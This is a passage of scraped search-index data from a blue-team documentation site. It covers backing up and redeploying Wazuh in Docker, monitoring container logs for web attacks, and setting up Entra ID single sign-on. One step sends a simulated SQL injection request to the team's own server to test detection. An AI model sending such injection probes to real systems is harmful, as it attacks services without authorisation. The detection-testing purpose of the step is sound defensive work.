single-node-wazuh.indexer-1:/usr/share/wazuh.indexer_backup.tar.gz ./wazuh.indexer_backup.tar.gz     ","version":"Next","tagName":"h3"},{"title":"3. Backup Wazuh Dashboard Data​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#3-backup-wazuh-dashboard-data","content":" 3.1. Enter the Wazuh Dashboard container:  docker exec -it --user root single-node-wazuh.dashboard-1 bash   3.2. Navigate to the /usr/share directory:  cd ../   3.3. Verify that the wazuh-dashboard directory exists:  ls   3.4. Create a compressed backup:  tar -czvf /usr/share/wazuh-dashboard_backup.tar.gz /usr/share/wazuh-dashboard     3.5. Exit the container:  exit   3.6. Copy the backup to the host machine:  Note: This step copies the backup to the current working directory (e.g., /home/usr/). To copy the backup to a centralized location, skip this step and follow the instructions in Section 4.  docker cp single-node-wazuh.dashboard-1:/usr/share/wazuh-dashboard_backup.tar.gz ./wazuh-dashboard_backup.tar.gz     ","version":"Next","tagName":"h3"},{"title":"4. Create a Centralized Backup Location​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#4-create-a-centralized-backup-location","content":" 4.1. Create a centralized directory if it does not already exist:  [ -d /var/backups/wazuh ] || mkdir -p /var/backups/wazuh   4.2. Ensure only users with root privileges can access the directory:  chown root:root /var/backups/wazuh chmod 700 /var/backups/wazuh   4.3. Copy backups to the centralized location:  Wazuh Manager: docker cp single-node-wazuh.manager-1:/var/ossec_backup.tar.gz /var/backups/wazuh/ossec_backup.tar.gz Wazuh Indexer: docker cp single-node-wazuh.indexer-1:/usr/share/wazuh.indexer_backup.tar.gz /var/backups/wazuh/wazuh.indexer_backup.tar.gz Wazuh Dashboard: docker cp single-node-wazuh.dashboard-1:/usr/share/wazuh-dashboard_backup.tar.gz /var/backups/wazuh/wazuh-dashboard_backup.tar.gz   ","version":"Next","tagName":"h3"},{"title":"Step 3: Remove all Wazuh Services, Images, and Volumes​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-3-remove-all-wazuh-services-images-and-volumes","content":" ","version":"Next","tagName":"h2"},{"title":"1. Remove Wazuh Services​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#1-remove-wazuh-services","content":" 1.1. Remove all Wazuh services/containers:  docker compose -f /opt/deploy/wazuh-docker/single-node/docker-compose.yml down     1.2. Alternatively, remove them individually:  docker compose -f /opt/deploy/wazuh-docker/single-node/docker-compose.yml rm -f wazuh.dashboard wazuh.manager wazuh.indexer   ","version":"Next","tagName":"h3"},{"title":"2. Remove Wazuh Images​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#2-remove-wazuh-images","content":"  docker rmi wazuh/wazuh-manager:4.5.0 wazuh/wazuh-indexer:4.5.0 wazuh/wazuh-dashboard:4.5.0     ","version":"Next","tagName":"h3"},{"title":"3. Remove Wazuh Volumes​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#3-remove-wazuh-volumes","content":" 3.1. Check Docker volumes associated with Wazuh:  docker volume ls     3.2. Remove Docker volumes:  Individually: docker volume rm single-node_wazuh-indexer-data \\ single-node_wazuh_active_response \\ single-node_wazuh_agentless \\ single-node_wazuh_api_configuration \\ single-node_wazuh_etc \\ single-node_wazuh_integrations \\ single-node_wazuh_logs \\ single-node_wazuh_queue \\ single-node_wazuh_var_multigroups \\ single-node_wazuh_wodles Based on naming conventions: docker volume ls | grep -E 'single-node_wazuh' | awk '{print $2}' | xargs docker volume rm   ","version":"Next","tagName":"h3"},{"title":"Step 4: Verify Removal of Wazuh Services​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-4-verify-removal-of-wazuh-services","content":" Verify all services are removed: docker ps   ","version":"Next","tagName":"h2"},{"title":"Step 5: Install Wazuh​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-5-install-wazuh","content":" ","version":"Next","tagName":"h2"},{"title":"1. Set Up Environment​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#1-set-up-environment","content":" 1.1. Switch to root:  sudo su   1.2. Configure the system's virtual memory:  echo &quot;vm.max_map_count=262144&quot; | sudo tee -a /etc/sysctl.conf   ","version":"Next","tagName":"h3"},{"title":"2. Install Docker and Docker Compose​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#2-install-docker-and-docker-compose","content":" 2.1. Install Docker:  curl -sSL https://get.docker.com/ | sh   2.2. Install Docker Compose:  curl -L &quot;https://github.com/docker/compose/releases/download/v2.20.3/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose   2.3. Make Docker Compose executable:  chmod +x /usr/local/bin/docker-compose     ","version":"Next","tagName":"h3"},{"title":"3. Deploy Wazuh​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#3-deploy-wazuh","content":" 3.1. Navigate to the deployment directory:  cd /opt/deploy   3.2. Remove any old Wazuh Docker repository:  ls   3.3. Clone the Wazuh 4.5.0 Docker repository:  git clone https://github.com/wazuh/wazuh-docker.git -b v4.5.0     3.4. Navigate to the single-node directory:  cd wazuh-docker/single-node/   3.5. Generate the indexer certificates:  docker compose -f generate-indexer-certs.yml run --rm generator     3.6. Start all Wazuh containers:  docker compose up -d      3.7. Start individual services if needed:  docker compose -f /opt/deploy/wazuh-docker/single-node/docker-compose.yml up -d   ","version":"Next","tagName":"h3"},{"title":"Step 6: Confirm Installation​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-6-confirm-installation","content":" Check that all required Wazuh instances/services are running: docker ps  ","version":"Next","tagName":"h2"},{"title":"Wazuh Implementation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-implementation-guide","content":"Wazuh Implementation","keywords":"","version":"Next"},{"title":"Wazuh Docker Container and Web Container Runtime Monitoring","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#overview","content":" This technical guide provides detailed step-by-step instructions on how to configure Wazuh to monitor Docker container lifecycle events and runtime web container logs on a Docker host. In addition, it enables detection of container activity and potential web-based attacks, enhancing overall visibility and incident response capabilities.    ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#prerequisites","content":" A Wazuh agent installed on the Docker host.Docker installed on the host system.Admin/Root access to the Wazuh Docker host (Linux server).Familiarity with docker, docker-compose, and basic Linux operations.    ","version":"Next","tagName":"h2"},{"title":"Step 1: Install Docker Python Library​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-1-install-docker-python-library","content":" Install the required Python library and dependencies to allow Wazuh to interface with Docker:  sudo su cd ~ apt-get update &amp;&amp; apt-get install python3 pip3 install docker==7.1.0 urllib3==2.2.2 requests==2.32.2       ","version":"Next","tagName":"h2"},{"title":"Step 2: Configure Wazuh Agent for Docker Listener​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-2-configure-wazuh-agent-for-docker-listener","content":" ","version":"Next","tagName":"h2"},{"title":"2.1. Enable Docker Listener in Wazuh Agent​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#21-enable-docker-listener-in-wazuh-agent","content":" Edit the agent configuration file:  vim /var/ossec/etc/ossec.conf   Add the following block:  &lt;wodle name=&quot;docker-listener&quot;&gt; &lt;interval&gt;10m&lt;/interval&gt; &lt;attempts&gt;5&lt;/attempts&gt; &lt;run_on_start&gt;no&lt;/run_on_start&gt; &lt;disabled&gt;no&lt;/disabled&gt; &lt;/wodle&gt;   Note: • This enables the Wazuh Docker wodle to collect Docker container metadata and activity events. • The listener attempts to execute five times at ten-minute intervals if it fails.    ","version":"Next","tagName":"h3"},{"title":"2.2. Restart Wazuh Agent​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#22-restart-wazuh-agent","content":" systemctl restart wazuh-agent       ","version":"Next","tagName":"h3"},{"title":"Step 3: Test Container Lifecycle Events​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-3-test-container-lifecycle-events","content":" ","version":"Next","tagName":"h2"},{"title":"3.1. Simulate typical container activity to verify detection:​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#31-simulate-typical-container-activity-to-verify-detection","content":" # 1. Start a container docker run -d --name test-container httpd # 2. Pause the container docker pause test-container # 3. Resume the container docker unpause test-container # 4. Stop the container docker stop test-container # 5. Remove the container docker rm test-container # 6. Remove the image docker rmi httpd     ","version":"Next","tagName":"h3"},{"title":"3.2. Observe the corresponding event logs​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#32-observe-the-corresponding-event-logs","content":"     ","version":"Next","tagName":"h3"},{"title":"Step 4: Configure Web Container Runtime Log Monitoring​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-4-configure-web-container-runtime-log-monitoring","content":" Configure the Wazuh agent on the Docker server to forward all container runtime logs to the Wazuh server.  ","version":"Next","tagName":"h2"},{"title":"4.1. Modify Wazuh Agent Config​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#41-modify-wazuh-agent-config","content":" vim /var/ossec/etc/ossec.conf     ","version":"Next","tagName":"h3"},{"title":"4.2. Add Configuration Block​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#42-add-configuration-block","content":" Add the configuration block below to monitor container logs  &lt;localfile&gt; &lt;log_format&gt;syslog&lt;/log_format&gt; &lt;location&gt;/var/lib/docker/containers/*/*-json.log&lt;/location&gt; &lt;/localfile&gt;     Note: • Wildcards * are used so Wazuh can monitor dynamically named container log paths. • The typical pattern is /var/lib/docker/containers/&lt;CONTAINER_ID&gt;/&lt;CONTAINER_ID&gt;-json.log.  ","version":"Next","tagName":"h3"},{"title":"4.3. Restart the Agent​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#43-restart-the-agent","content":" systemctl restart wazuh-agent       ","version":"Next","tagName":"h3"},{"title":"Step 5: Configure Wazuh Server Decoders​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-5-configure-wazuh-server-decoders","content":" ","version":"Next","tagName":"h2"},{"title":"5.1. Edit Local Decoder File​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#51-edit-local-decoder-file","content":" vim /var/ossec/etc/decoders/local_decoder.xml     ","version":"Next","tagName":"h3"},{"title":"5.2. Add Decoders​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#52-add-decoders","content":" Add the following decoders:  &lt;decoder name=&quot;web-accesslog-docker&quot;&gt; &lt;parent&gt;json&lt;/parent&gt; &lt;type&gt;web-log&lt;/type&gt; &lt;use_own_name&gt;true&lt;/use_own_name&gt; &lt;prematch offset=&quot;after_parent&quot;&gt;^log&quot;:&quot;\\S+ \\S+ \\S+ \\.*[\\S+ \\S\\d+] \\.*&quot;\\w+ \\S+ HTTP\\S+&quot; \\d+&lt;/prematch&gt; &lt;regex offset=&quot;after_parent&quot;&gt;^log&quot;:&quot;(\\S+) \\S+ \\S+ \\.*[\\S+ \\S\\d+] \\.*&quot;(\\w+) (\\S+) HTTP\\S+&quot; (\\d+)&lt;/regex&gt; &lt;order&gt;srcip,protocol,url,id&lt;/order&gt; &lt;/decoder&gt; &lt;decoder name=&quot;json&quot;&gt; &lt;parent&gt;json&lt;/parent&gt; &lt;use_own_name&gt;true&lt;/use_own_name&gt; &lt;plugin_decoder&gt;JSON_Decoder&lt;/plugin_decoder&gt; &lt;/decoder&gt;     ","version":"Next","tagName":"h3"},{"title":"5.3. Restart the Wazuh Manager​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#53-restart-the-wazuh-manager","content":" docker restart single-node-wazuh.manager-1       ","version":"Next","tagName":"h3"},{"title":"Step 6: Simulate Web Attacks in Containers​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#step-6-simulate-web-attacks-in-containers","content":" ","version":"Next","tagName":"h2"},{"title":"6.1. Run a web container and simulate a SQLi attack to generate attack-like logs​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#61-run-a-web-container-and-simulate-a-sqli-attack-to-generate-attack-like-logs","content":" # 1. Create a web container called test-container docker run --name test-container -p 8082:80 -d nginx # 2. Normal access – check that the web container is running and accessible by sending a request. curl http://redback.it.deakin.edu.au:8082 # 3. Simulate a SQL injection attempt by sending a crafted request. curl -XGET &quot;http://redback.it.deakin.edu.au:8082/users/?id=SELECT+*+FROM+users&quot;   Note: If an alert isn’t triggered immediately, wait briefly and repeat the SQLi request.    ","version":"Next","tagName":"h3"},{"title":"6.2. Observe the corresponding event logs in the Wazuh Dashboard.​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#62-observe-the-corresponding-event-logs-in-the-wazuh-dashboard","content":"     ","version":"Next","tagName":"h3"},{"title":"Notes​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#notes","content":" Ensure container logging drivers are set to json-file (default).Docker logs must be readable by the Wazuh agent.Alerts will appear in the Wazuh Dashboard tagged under web, accesslog, attack, and/or sql_injection for web access logs, and docker for container lifecycle events.    ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Wazuh Docker Container and Web Container Runtime Monitoring","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-docker-runtime-monitoring#references","content":" https://documentation.wazuh.com/current/user-manual/capabilities/container-security/use-cases.htmlhttps://wazuh.com/blog/docker-container-security-monitoring-with-wazuh/ ","version":"Next","tagName":"h2"},{"title":"Wazuh Module slides","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-powerpoint","content":"Wazuh Module slides Documentation of the Wazuh open-source security platform with a more visual approach: Author: Lachlan Harrison, 17/09/2024","keywords":"","version":"Next"},{"title":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#overview","content":" This guide provides step-by-step instructions for integrating Microsoft Entra ID (formerly known as Azure AD) as an Identity Provider (IdP) to enable Single Sign-On and enforce Role-Based Access Control (RBAC) for the Wazuh SIEM platform at Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"Integration Overview​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#integration-overview","content":" Outlined below are the major steps involved in the SSO and RBAC integration:  Microsoft Entra ID ConfigurationWazuh indexer configurationWazuh dashboard configurationRBAC Role Mapping  ","version":"Next","tagName":"h2"},{"title":"Step 1: Microsoft Entra ID Configuration​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-1-microsoft-entra-id-configuration","content":" ","version":"Next","tagName":"h2"},{"title":"1.1. Prerequisites​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#11-prerequisites","content":" 1.1.1. Log in to the Microsoft Entra ID portal at https://entra.microsoft.com/. 1.1.2. Ensure that the account that you are logged in with has one of the following roles assigned:  Application AdministratorCloud Application AdministratorGlobal Administrator  ","version":"Next","tagName":"h3"},{"title":"1.2. Create Enterprise Application​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#12-create-enterprise-application","content":" 1.2.1. Navigate to Microsoft Entra ID -&gt; Enterprise applications -&gt; New application -&gt; Create your own application. 1.2.2. Select Integrate any other application you don't find in the gallery. Give a name to the application and click Create. In our case, we name this application redback-wazuh-sso.   ","version":"Next","tagName":"h3"},{"title":"1.3. Create Application Role​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#13-create-application-role","content":" 1.3.1. Go back to the Microsoft Entra ID portal. 1.3.2. Click on App Registrations.   1.3.3. Select the application created in step 1.2.2 above i.e. redback-wazuh-sso. 1.3.4. Go to App Roles -&gt; Create app role. 1.3.5. Example of an App Role: • Display name: Redback Wazuh Admin • Allowed member types: Users/Groups • Value: Redback_Wazuh_Admin • Description: Redback Wazuh Admin Role   1.3.6. Click Apply to save the changes and proceed to the next step.   ","version":"Next","tagName":"h3"},{"title":"1.4. Assign Users/Groups​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#14-assign-usersgroups","content":" 1.4.1. Go back to the Microsoft Entra ID portal. 1.4.2. Navigate to Enterprise Applications. 1.4.3. Select the application. 1.4.4. Go to Manage -&gt; Users and groups. 1.4.5. Click on Add user/group.   1.4.6. In the Add Assignment step, add user/s or group/s or a combination of both as required. In our case, we add an Entra ID group called Redback_Wazuh_Admin_Group and assign it the app role Redback_Wazuh_Admin.  Note: • After the assignment, users/members of the Redback_Wazuh_Admin_Group will automatically be assigned the Redback_Wazuh_Admin backend role in Wazuh.     1.4.7. Click Assign to save the configuration.  ","version":"Next","tagName":"h3"},{"title":"1.5. Configure Single Sign-On (SSO)​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#15-configure-single-sign-on-sso","content":" 1.5.1. Go to the application redback-wazuh-sso -&gt; Set up single sign-on -&gt; SAML. 1.5.2. Under Basic SAML Configuration, click Edit and set the following values: • Identifier (Entity ID): redback-wazuh-saml • Reply URL: https://&lt;WAZUH_DASHBOARD_URL&gt;/_opendistro/_security/saml/acs • Sign on URL: https://&lt;WAZUH_DASHBOARD_URL&gt; | eg: https://redback.it.deakin.edu.au   1.5.3. Save and proceed to the next step. 1.5.4. Under Attributes &amp; Claims, click Edit and select Add new claim: • Name: Roles • Source Attribute: user.assignedroles 1.5.5. Note the parameters below, which will be used in the Wazuh indexer configuration later. • App Federation Metadata Url -&gt; idp.metadata_url • Microsoft Entra ID Identifier -&gt; idp.entity_id   ","version":"Next","tagName":"h3"},{"title":"Step 2: Wazuh indexer configuration​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-2-wazuh-indexer-configuration","content":" ","version":"Next","tagName":"h2"},{"title":"2.1. Generate exchange key​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#21-generate-exchange-key","content":" • Generate a 64-character long random key using the command - openssl rand -hex 32. • Please note the output key, which will be used as the exchange_key in the /etc/wazuh-indexer/opensearch-security/config.yml file.  openssl rand -hex 32     ","version":"Next","tagName":"h3"},{"title":"2.2. Edit /etc/wazuh-indexer/opensearch-security/config.yml​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#22-edit-etcwazuh-indexeropensearch-securityconfigyml","content":" 2.2.1. Set order and challenge flag • order: 0 • challenge: false  2.2.2. Add saml_auth_domain section under the authc section  saml_auth_domain: http_enabled: true transport_enabled: false order: 1 http_authenticator: type: saml challenge: true config: idp: metadata_url: https://login.microsoftonline.com/.../federationmetadata/2007-06/federationmetadata.xml?appid=... entity_id: https://sts.windows.net/... sp: entity_id: redback-wazuh-saml kibana_url: https://redback.it.deakin.edu.au/ roles_key: Roles exchange_key: &lt;64-char key from above&gt; authentication_backend: type: noop      ","version":"Next","tagName":"h3"},{"title":"2.3. Apply with securityadmin.sh​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#23-apply-with-securityadminsh","content":" • Run the securityadmin script to load the configuration changes made in the config.yml file.  export JAVA_HOME=/usr/share/wazuh-indexer/jdk/ &amp;&amp; bash /usr/share/wazuh-indexer/plugins/opensearch-security/tools/securityadmin.sh -f /usr/share/wazuh-indexer/opensearch-security/config.yml -icl -key /usr/share/wazuh-indexer/certs/admin-key.pem -cert /usr/share/wazuh-indexer/certs/admin.pem -cacert /usr/share/wazuh-indexer/certs/root-ca.pem -h redback.it.deakin.edu.au -nhnv   • You should see a similar output as shown in the screenshot below:  ","version":"Next","tagName":"h3"},{"title":"2.4. Edit /etc/wazuh-indexer/opensearch-security/roles_mapping.yml​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#24-edit-etcwazuh-indexeropensearch-securityroles_mappingyml","content":"   ","version":"Next","tagName":"h3"},{"title":"2.5. Configure roles_mapping.yml file​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#25-configure-roles_mappingyml-file","content":" • Configure the roles_mapping.yml file to map the App Role value we have in Microsoft Entra ID to the appropriate Wazuh indexer role. • In this case, we map the Redback_Wazuh_Admin App Role value in Microsoft Entra ID to the all_access role in the Wazuh indexer as shown in the screenshot below:   ","version":"Next","tagName":"h3"},{"title":"2.6. Apply with securityadmin.sh​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#26-apply-with-securityadminsh","content":" • Run the securityadmin script to load the configuration changes made in the roles_mapping.yml file.  export JAVA_HOME=/usr/share/wazuh-indexer/jdk/ &amp;&amp; bash /usr/share/wazuh-indexer/plugins/opensearch-security/tools/securityadmin.sh -f /usr/share/wazuh-indexer/opensearch-security/roles_mapping.yml -icl -key /usr/share/wazuh-indexer/certs/admin-key.pem -cert /usr/share/wazuh-indexer/certs/admin.pem -cacert /usr/share/wazuh-indexer/certs/root-ca.pem -h redback.it.deakin.edu.au -nhnv   • You should see a similar output as shown in the screenshot below:  ","version":"Next","tagName":"h3"},{"title":"Step 3: Wazuh dashboard configuration​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-3-wazuh-dashboard-configuration","content":" ","version":"Next","tagName":"h2"},{"title":"3.1. Set run_as to false​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#31-set-run_as-to-false","content":" • Edit the /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml configuration file. • Verify that run_as is set to false.   ","version":"Next","tagName":"h3"},{"title":"3.2. Add SAML config​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#32-add-saml-config","content":" • Edit the Wazuh dashboard configuration file. Add these configurations to /etc/wazuh-dashboard/opensearch_dashboards.yml.  opensearch_security.auth.type: &quot;saml&quot; server.xsrf.allowlist: [&quot;/_opendistro/_security/saml/acs&quot;, &quot;/_opendistro/_security/saml/logout&quot;, &quot;/_opendistro/_security/saml/acs/idpinitiated&quot;] opensearch_security.session.keepalive: false      ","version":"Next","tagName":"h3"},{"title":"3.3. Restart the Wazuh Dashboard service​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#33-restart-the-wazuh-dashboard-service","content":" systemctl restart wazuh-dashboard     ","version":"Next","tagName":"h3"},{"title":"Step 4: Validate SSO​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) 